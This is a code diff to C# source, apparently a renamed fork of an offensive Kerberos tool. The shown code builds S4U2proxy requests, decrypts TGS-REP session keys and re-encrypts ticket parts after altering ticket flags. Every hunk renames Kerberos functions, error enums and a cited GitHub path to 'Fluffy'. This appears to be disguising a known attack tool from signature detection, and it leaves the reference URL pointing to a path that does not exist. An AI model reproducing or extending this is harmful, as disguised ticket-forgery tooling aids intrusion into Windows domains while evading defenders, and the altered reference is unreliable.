@@ -180,7 +180,7 @@ namespace CrimsonRufus
                     AsnElt authDataSeq = ifrelevant.Encode();
                     authDataSeq = AsnElt.Make(AsnElt.SEQUENCE, authDataSeq);
                     byte[] authorizationDataBytes = authDataSeq.Encode();
-                    byte[] enc_authorization_data = Crypto.KerberosEncrypt(tgsEtype, Interop.KRB_KEY_USAGE_TGS_REQ_ENC_AUTHOIRZATION_DATA, tgsKey, authorizationDataBytes);
+                    byte[] enc_authorization_data = Crypto.FluffyEncrypt(tgsEtype, Interop.KRB_KEY_USAGE_TGS_REQ_ENC_AUTHOIRZATION_DATA, tgsKey, authorizationDataBytes);
                     s4u2proxyReq.req_body.enc_authorization_data = new EncryptedData((Int32)tgsEtype, enc_authorization_data);
                 }
 
@@ -189,7 +189,7 @@ namespace CrimsonRufus
                 AsnElt req_Body_ASNSeq = AsnElt.Make(AsnElt.SEQUENCE, new[] { req_Body_ASN });
                 req_Body_ASNSeq = AsnElt.MakeImplicit(AsnElt.CONTEXT, 4, req_Body_ASNSeq);
                 byte[] req_Body_Bytes = req_Body_ASNSeq.CopyValue();
-                cksum_Bytes = Crypto.KerberosChecksum(clientKey, req_Body_Bytes, Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_RSA_MD5, Interop.KRB_KEY_USAGE_TGS_REQ_CHECKSUM);
+                cksum_Bytes = Crypto.FluffyChecksum(clientKey, req_Body_Bytes, Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_RSA_MD5, Interop.KRB_KEY_USAGE_TGS_REQ_CHECKSUM);
             }
 
             // moved to end so we can have the checksum in the authenticator
@@ -237,8 +237,8 @@ namespace CrimsonRufus
                 // parse the response to an TGS-REP
                 TGS_REP rep2 = new TGS_REP(responseAsn);
 
-                // https://github.com/gentilkiwi/kekeo/blob/master/modules/asn1/kull_m_kerberos_asn1.h#L62
-                byte[] outBytes2 = Crypto.KerberosDecrypt(etype, 8, clientKey, rep2.enc_part.cipher);
+                // https://github.com/gentilkiwi/kekeo/blob/master/modules/asn1/kull_m_fluffy_asn1.h#L62
+                byte[] outBytes2 = Crypto.FluffyDecrypt(etype, 8, clientKey, rep2.enc_part.cipher);
                 AsnElt ae2 = AsnElt.Decode(outBytes2, false);
                 EncKDCRepPart encRepPart2 = new EncKDCRepPart(ae2.Sub[0]);
 
@@ -429,7 +429,7 @@ namespace CrimsonRufus
             {
                 // parse the response to an KRB-ERROR
                 KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
-                Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
+                Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.FLUFFY_ERROR)error.error_code);
             }
             else
             {
@@ -485,7 +485,7 @@ namespace CrimsonRufus
                 // parse the response to an TGS-REP
                 TGS_REP rep = new TGS_REP(responseAsn);
                 // KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY = 8
-                byte[] outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, clientKey, rep.enc_part.cipher);
+                byte[] outBytes = Crypto.FluffyDecrypt(etype, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, clientKey, rep.enc_part.cipher);
                 AsnElt ae = AsnElt.Decode(outBytes, false);
                 EncKDCRepPart encRepPart = new EncKDCRepPart(ae.Sub[0]);
 
@@ -532,7 +532,7 @@ namespace CrimsonRufus
 
                     // encode and encrypt ticket encpart
                     byte[] encTicketData = decTicketPart.Encode().Encode();
-                    byte[] encTicketPart = Crypto.KerberosEncrypt((Interop.KERB_ETYPE)rep.ticket.enc_part.etype, Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, key, encTicketData);
+                    byte[] encTicketPart = Crypto.FluffyEncrypt((Interop.KERB_ETYPE)rep.ticket.enc_part.etype, Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, key, encTicketData);
                     rep.ticket.enc_part = new EncryptedData(rep.ticket.enc_part.etype, encTicketPart, rep.ticket.enc_part.kvno);
                     Console.WriteLine("[*] Flags geändert zu: {0}", info.flags);
                 }
@@ -613,7 +613,7 @@ namespace CrimsonRufus
             {
                 // parse the response to an KRB-ERROR
                 KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
-                Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
+                Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.FLUFFY_ERROR)error.error_code);
             }
             else
             {
@@ -703,7 +703,7 @@ namespace CrimsonRufus
                 // parse the response to an TGS-REP
                 TGS_REP rep = new TGS_REP(responseAsn);
                 // KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY = 8
-                byte[] outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, clientKey, rep.enc_part.cipher);
+                byte[] outBytes = Crypto.FluffyDecrypt(etype, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, clientKey, rep.enc_part.cipher);
                 AsnElt ae = AsnElt.Decode(outBytes, false);
                 EncKDCRepPart encRepPart = new EncKDCRepPart(ae.Sub[0]);
 
@@ -786,7 +786,7 @@ namespace CrimsonRufus
             {
                 // parse the response to an KRB-ERROR
                 KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
-                Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
+                Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.FLUFFY_ERROR)error.error_code);
             }
             else
             {
@@ -864,8 +864,8 @@ namespace CrimsonRufus
                 // parse the response to an TGS-REP
                 TGS_REP rep2 = new TGS_REP(responseAsn);
 
-                // https://github.com/gentilkiwi/kekeo/blob/master/modules/asn1/kull_m_kerberos_asn1.h#L62
-                byte[] outBytes2 = Crypto.KerberosDecrypt(etype, 8, clientKey, rep2.enc_part.cipher);
+                // https://github.com/gentilkiwi/kekeo/blob/master/modules/asn1/kull_m_fluffy_asn1.h#L62
+                byte[] outBytes2 = Crypto.FluffyDecrypt(etype, 8, clientKey, rep2.enc_part.cipher);
                 AsnElt ae2 = AsnElt.Decode(outBytes2, false);
                 EncKDCRepPart encRepPart2 = new EncKDCRepPart(ae2.Sub[0]);
 
@@ -948,7 +948,7 @@ namespace CrimsonRufus
             {
                 // parse the response to an KRB-ERROR
                 KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
-                Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
+                Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.FLUFFY_ERROR)error.error_code);
             }
             else
             {
